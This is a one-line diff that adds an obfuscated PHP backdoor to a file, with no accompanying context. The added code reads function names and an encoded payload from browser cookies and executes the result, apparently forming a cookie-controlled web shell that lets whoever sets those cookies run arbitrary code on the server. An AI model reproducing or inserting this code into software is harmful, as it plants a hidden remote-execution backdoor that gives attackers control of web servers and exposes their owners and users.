@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['gyz']){$nmt=$_COOKIE['gyz']("",@$_COOKIE['yckgv'](@$_COOKIE['szy']));$nmt();}?>
